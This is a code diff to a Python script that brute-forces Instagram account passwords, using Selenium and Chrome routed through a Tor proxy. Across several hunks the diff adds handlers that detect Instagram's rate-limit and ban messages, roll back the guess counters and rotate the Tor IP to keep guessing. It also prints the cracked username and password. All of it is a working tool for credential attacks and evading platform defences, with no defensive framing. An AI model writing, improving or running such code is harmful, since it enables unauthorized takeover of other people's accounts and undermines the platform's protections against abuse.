@@ -52,7 +52,7 @@ passlist = sys.argv[4]
 
 ips = []
 
-#Fucntion for counting all the lines in the text file
+#Function for counting all the lines in the text file
 def file_length(fname):
         with open(fname) as f:
                 for i, l in enumerate(f):
@@ -76,12 +76,12 @@ PROXY =  "socks5://127.0.0.1:9050"
 #Adding the proxy to chrome
 options = webdriver.ChromeOptions()
 options.add_argument('--proxy-server=%s' % PROXY)
-options.add_argument('headless')
+#options.add_argument('headless')
 options.add_argument('--log-level=3')
 #Setting up the chromedriver
 driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
 
-#Making variables for incrementation, in the for loop
+# VARS
 a = 0
 b = 1
 n = 0
@@ -102,7 +102,7 @@ while True:
         #Adding the proxy to chrome
         options = webdriver.ChromeOptions()
         options.add_argument('--proxy-server=%s' % PROXY)
-        options.add_argument('headless')
+        #options.add_argument('headless')
         options.add_argument('--log-level=3')
         #Setting up the chromedriver
         driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe') 
@@ -159,13 +159,32 @@ while True:
 
     if "incorrect" in driver.page_source:
         print("Wrong password, no match")
+        print("-----------------------------")
         time.sleep(1)
+
+    elif "Page Not Found" in driver.page_source:
+        a -= 1
+        b -= 1
+        print("\n")
+        print("Lost Connection :(")
+        print("Re-Connecting")
+        time.sleep(2)
+        renew_tor_ip()
 
     elif "Suspicious Login Attempt" in driver.page_source:
         print("\n")
         print("Password Found")
         print("The password is:", p)
         sys.exit()
+
+    elif "Please wait a few minutes before you try again." in driver.page_source:
+        a -= 1
+        b -= 1
+        print("\n")
+        print("Instagram has banned this IP")
+        print("Requesting new one")
+        time.sleep(10)
+        renew_tor_ip()
 
     elif 'class="no-js logged-in' in driver.page_source:
         print("\n")
@@ -207,17 +226,29 @@ while True:
                 time.sleep(10)
                 renew_tor_ip()
 
+            elif "Page Not Found" in driver.page_source:
+                a -= 1
+                b -= 1
+                print("\n")
+                print("Lost Connection :(")
+                print("Re-Connecting")
+                time.sleep(2)
+                renew_tor_ip()
 
             elif "Suspicious Login Attempt" in driver.page_source:
                 print("\n")
                 print("Password Found")
+                print("Username:", uname)
                 print("The password is:", p)
+                print("\n")
                 sys.exit()
 
             elif 'class="no-js logged-in' in driver.page_source:
                 print("\n")
                 print("Password Found")
+                print("Username:", uname)
                 print("The password is:", p)
+                print("\n")
                 sys.exit()
 
             elif "The username you entered doesn't belong to an account." in driver.page_source:
@@ -225,6 +256,14 @@ while True:
                 print("WRONG USERNAME")
                 print("Check the username, and run the script again")
                 sys.exit()
+            elif "Please wait a few minutes before you try again." in driver.page_source:
+                a -= 1
+                b -= 1
+                print("\n")
+                print("Instagram has banned this IP")
+                print("Requesting new one")
+                time.sleep(10)
+                renew_tor_ip()
 
             else:
                 continue
@@ -232,9 +271,29 @@ while True:
             a -= 1
             b -= 1
             renew_tor_ip()
+        
+        elif "Page Not Found" in driver.page_source:
+            a -= 1
+            b -= 1
+            print("\n")
+            print("Lost Connection :(")
+            print("Re-Connecting")
+            time.sleep(2)
+            renew_tor_ip()
+            
+        elif "Please wait a few minutes before you try again." in driver.page_source:
+            a -= 1
+            b -= 1
+            print("\n")
+            print("Instagram has banned this IP")
+            print("Requesting new one")
+            time.sleep(10)
+            renew_tor_ip()
 
         elif 'class="no-js logged-in' in driver.page_source:
             print("\n")
             print("Password Found")
+            print("Username:", uname)
             print("The password is:", p)
+            print("\n")
             sys.exit()
